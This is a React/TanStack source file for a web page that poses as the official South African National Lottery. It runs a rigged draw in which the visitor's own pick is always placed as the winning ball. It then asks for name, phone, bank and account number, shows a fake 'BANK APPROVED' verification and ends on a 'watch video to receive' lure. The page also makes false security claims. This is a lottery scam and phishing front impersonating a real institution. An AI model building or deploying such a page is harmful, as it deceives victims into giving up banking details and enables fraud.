import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useMemo, useState } from "react";
import { TopBar, Header, Footer, lotteryStyles } from "@/components/lottery-layout";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "South African National Lottery — Official Draw" },
      {
        name: "description",
        content:
          "Official South African National Lottery draw. Enter for a chance to win up to R 150,000,000.",
      },
      { property: "og:title", content: "South African National Lottery" },
      {
        property: "og:description",
        content: "Enter the official draw for a chance to win big prizes.",
      },
    ],
  }),
  component: LotteryQuiz,
});

type Prize = { id: string; label: string; amount: number; icon: string };

const PRIZES: Prize[] = [
  { id: "1", label: "First Prize", amount: 150_000_000, icon: "🥇" },
  { id: "2", label: "Second Prize", amount: 60_000_000, icon: "🥈" },
  { id: "3", label: "Third Prize", amount: 30_000_000, icon: "🥉" },
  { id: "4", label: "Fourth Prize", amount: 15_000_000, icon: "🏆" },
  { id: "5", label: "Fifth Prize", amount: 6_000_000, icon: "🎯" },
];

type Bank = { id: string; name: string; initials: string; color: string };

const BANKS: Bank[] = [
  { id: "absa", name: "ABSA", initials: "A", color: "#E2231A" },
  { id: "standard", name: "Standard Bank", initials: "SB", color: "#0033A0" },
  { id: "fnb", name: "FNB", initials: "FNB", color: "#00945E" },
  { id: "nedbank", name: "Nedbank", initials: "N", color: "#006A4D" },
  { id: "capitec", name: "Capitec", initials: "C", color: "#111827" },
  { id: "investec", name: "Investec", initials: "I", color: "#1A1A1A" },
  { id: "african", name: "African Bank", initials: "AB", color: "#0B5FA5" },
  { id: "tyme", name: "TymeBank", initials: "T", color: "#FFC72C" },
  { id: "discovery", name: "Discovery Bank", initials: "D", color: "#A8123E" },
  { id: "bidvest", name: "Bidvest Bank", initials: "B", color: "#D2202F" },
];

type Stage = "form" | "draw" | "result" | "bank" | "approved";

function formatRand(n: number, decimals = 0) {
  return (
    "R " +
    n.toLocaleString("en-ZA", {
      minimumFractionDigits: decimals,
      maximumFractionDigits: decimals,
    })
  );
}

function LotteryQuiz() {
  const navigate = useNavigate({ from: "/" });
  const [stage, setStage] = useState<Stage>("form");
  const [ageOk, setAgeOk] = useState(false);

  // form
  const [fullName, setFullName] = useState("");
  const [phone, setPhone] = useState("");
  const [prizeId, setPrizeId] = useState<string>("");

  // draw
  const [pickedNumber, setPickedNumber] = useState<number | null>(null);
  const [drawnNumbers, setDrawnNumbers] = useState<(number | null)[]>([
    null,
    null,
    null,
    null,
    null,
  ]);
  const [drawing, setDrawing] = useState(false);
  const drawId = useMemo(() => Math.floor(1000 + Math.random() * 9000), []);

  // bank
  const [bankId, setBankId] = useState<string>("");
  const [accountNumber, setAccountNumber] = useState("");

  const prize = PRIZES.find((p) => p.id === prizeId) ?? null;
  const wonAmount = prize ? Math.round(prize.amount * 0.0001) : 0; // small "won" amount like the original
  const selectedBank = BANKS.find((b) => b.id === bankId) ?? null;

  const formValid = fullName.trim().length > 1 && phone.trim().length >= 8 && !!prizeId;
  const bankValid = !!bankId && accountNumber.replace(/\D/g, "").length >= 6;

  function startDraw(n: number) {
    if (drawing) return;
    setPickedNumber(n);
    setDrawing(true);
    const positions = [0, 1, 2, 3, 4];
    positions.forEach((pos, i) => {
      setTimeout(() => {
        setDrawnNumbers((prev) => {
          const next = [...prev];
          // last position is the user's number; others are random 1..50
          next[pos] =
            pos === positions.length - 1
              ? n
              : Math.floor(Math.random() * 50) + 1;
          return next;
        });
        if (i === positions.length - 1) {
          setTimeout(() => {
            setDrawing(false);
            setStage("result");
          }, 600);
        }
      }, 900 * (i + 1));
    });
  }

  return (
    <div className="page">
      {!ageOk && <AgeGate onConfirm={() => setAgeOk(true)} />}

      <TopBar />
      <Header />

      <main className="main">
        {stage === "form" && (
          <Card>
            <div className="trophy">🏆</div>
            <h1 className="title">YOU HAVE THE CHANCE TO WIN ONE OF THESE PRIZES</h1>
            <p className="subtitle">Enter your details and pick the prize you want to win.</p>

            <label className="label" htmlFor="fullName">Full name</label>
            <input
              id="fullName"
              className="input"
              placeholder="e.g. Thabo Mokoena"
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
            />

            <label className="label" htmlFor="phone">Phone number</label>
            <input
              id="phone"
              className="input"
              placeholder="e.g. 071 234 5678"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              inputMode="tel"
            />

            <div className="label" style={{ marginTop: 18 }}>Choose your desired prize:</div>
            <div className="prizes">
              {PRIZES.map((p) => (
                <button
                  key={p.id}
                  type="button"
                  className={`prize ${prizeId === p.id ? "prize--active" : ""}`}
                  onClick={() => setPrizeId(p.id)}
                >
                  <span className="prize__left">
                    <span className="prize__icon">{p.icon}</span>
                    <span>{p.label}</span>
                  </span>
                  <span className="prize__amount">{formatRand(p.amount)}</span>
                </button>
              ))}
            </div>

            <button
              className="cta cta--primary"
              disabled={!formValid}
              onClick={() => formValid && setStage("draw")}
            >
              ⭐ ENTER THE DRAW
            </button>
            <div className="micro">🔒 Secure &amp; confidential</div>
          </Card>
        )}

        {stage === "draw" && prize && (
          <Card>
            <div className="hello">
              Hello, <strong>{fullName.split(" ")[0] || "Player"}</strong>
            </div>
            <div className="competing">
              You are competing for <span className="competing__prize">{prize.label}</span>
            </div>
            <div className="amount-green">{formatRand(prize.amount)}</div>
            <p className="muted center">Pick your lucky number for the official draw:</p>

            <div className="live">
              <div className="live__head">
                <span className="live__badge">🔴 LIVE DRAW</span>
                <span className="live__id">#{drawId}</span>
              </div>
              <div className="balls">
                {drawnNumbers.map((n, i) => (
                  <div
                    key={i}
                    className={`ball ${n != null ? "ball--filled" : ""} ${
                      i === drawnNumbers.length - 1 && n != null ? "ball--mine" : ""
                    }`}
                  >
                    {n ?? "?"}
                  </div>
                ))}
              </div>
            </div>

            <p className="center label" style={{ marginTop: 18 }}>
              Choose your lucky number:
            </p>
            <div className="numbers">
              {Array.from({ length: 10 }, (_, i) => i + 1).map((n) => (
                <button
                  key={n}
                  className={`num ${pickedNumber === n ? "num--picked" : ""}`}
                  disabled={drawing || pickedNumber != null}
                  onClick={() => startDraw(n)}
                >
                  {n}
                </button>
              ))}
            </div>
          </Card>
        )}

        {stage === "result" && prize && (
          <>
            <Card>
              <div className="hello">
                Hello, <strong>{fullName.split(" ")[0] || "Player"}</strong>
              </div>
              <div className="competing">
                You are competing for <span className="competing__prize">{prize.label}</span>
              </div>
              <div className="amount-green">{formatRand(prize.amount)}</div>
              <p className="muted center">Draw completed!</p>
              <div className="live">
                <div className="live__head">
                  <span className="live__badge">🔴 LIVE DRAW</span>
                  <span className="live__id">#{drawId}</span>
                </div>
                <div className="balls">
                  {drawnNumbers.map((n, i) => (
                    <div
                      key={i}
                      className={`ball ball--filled ${
                        i === drawnNumbers.length - 1 ? "ball--mine" : ""
                      }`}
                    >
                      {n}
                    </div>
                  ))}
                </div>
                <p className="center" style={{ marginTop: 12, color: "#cfe1ff" }}>
                  Your number: <strong style={{ color: "#ffd166" }}>{pickedNumber}</strong>
                </p>
              </div>
            </Card>

            <div className="win-card">
              <div className="win__emoji">🎉</div>
              <div className="win__title">CONGRATULATIONS!</div>
              <p className="win__text">
                Your number <strong>{pickedNumber}</strong> was drawn! You won the
              </p>
              <div className="win__label">Prize Won</div>
              <div className="win__amount">{formatRand(wonAmount, 2)}</div>
              <button className="cta cta--success" onClick={() => setStage("bank")}>
                CLAIM MY PRIZE →
              </button>
            </div>
          </>
        )}

        {stage === "bank" && (
          <Card className="card--bordered">
            <div className="confirmed">💰 PRIZE CONFIRMED: {formatRand(wonAmount, 2)}</div>
            <h2 className="title" style={{ marginTop: 18 }}>
              Where should we deposit your winnings?
            </h2>
            <p className="subtitle">
              Select your South African bank and enter your account details.
            </p>

            <div className="label">Select your bank:</div>
            <div className="banks">
              {BANKS.map((b) => (
                <button
                  key={b.id}
                  className={`bank ${bankId === b.id ? "bank--active" : ""}`}
                  onClick={() => setBankId(b.id)}
                >
                  <span className="bank__chip" style={{ background: b.color }}>
                    {b.initials}
                  </span>
                  <span className="bank__name">{b.name}</span>
                </button>
              ))}
            </div>

            <label className="label" htmlFor="holder">Account holder</label>
            <input
              id="holder"
              className="input"
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
            />

            <label className="label" htmlFor="acct">Account number</label>
            <input
              id="acct"
              className="input"
              placeholder="e.g. 1234567890"
              value={accountNumber}
              onChange={(e) => setAccountNumber(e.target.value)}
              inputMode="numeric"
            />

            <button
              className="cta cta--success"
              disabled={!bankValid}
              onClick={() => bankValid && setStage("approved")}
            >
              PROCESS MY DEPOSIT →
            </button>
            <div className="micro">🔒 Bank-level encryption · SSL secured</div>
          </Card>
        )}

        {stage === "approved" && selectedBank && (
          <Card className="card--bordered">
            <div className="check">✅</div>
            <div className="approved">BANK APPROVED!</div>

            <div className="verified">
              <span className="bank__chip" style={{ background: selectedBank.color }}>
                {selectedBank.initials}
              </span>
              <div>
                <div className="verified__label">VERIFIED</div>
                <div className="verified__name">{selectedBank.name}</div>
              </div>
            </div>
            <p className="center muted">
              Your account has been verified, <strong>{fullName.split(" ")[0]}</strong>.
            </p>

            <div className="warn">
              <strong>⚠️ ONE LAST STEP TO UNLOCK YOUR {formatRand(wonAmount, 2)}</strong>
              <p>
                For security reasons, watch a quick <strong>30-second video</strong> to learn
                how to receive your money <strong>instantly</strong>. After watching, the
                transfer will be released to your account.
              </p>
            </div>

            <button className="cta cta--watch">▶️ WATCH VIDEO TO RECEIVE</button>
          </Card>
        )}
      </main>

      <Footer />
      <style>{lotteryStyles}</style>
    </div>
  );
}

function Card({ children, className = "" }: { children: React.ReactNode; className?: string }) {
  return <section className={`card ${className}`}>{children}</section>;
}

function AgeGate({ onConfirm }: { onConfirm: () => void }) {
  return (
    <div className="modal">
      <div className="modal__box">
        <div className="age">18+</div>
        <h3 className="modal__title">Age Verification</h3>
        <p className="modal__text">
          This site is restricted to adults. By continuing, you confirm that you are{" "}
          <strong>18 years of age or older</strong> and legally allowed to participate in
          lottery activities in your country.
        </p>
        <p className="modal__fine">
          Play responsibly. National Responsible Gambling Programme — 0800 006 008.
        </p>
        <button className="cta cta--success" onClick={onConfirm}>
          ✓ I am 18 or older — Enter
        </button>
        <button
          className="cta cta--ghost"
          onClick={() => {
            window.location.href = "https://www.google.com";
          }}
        >
          I am under 18 — Exit
        </button>
      </div>
    </div>
  );
}

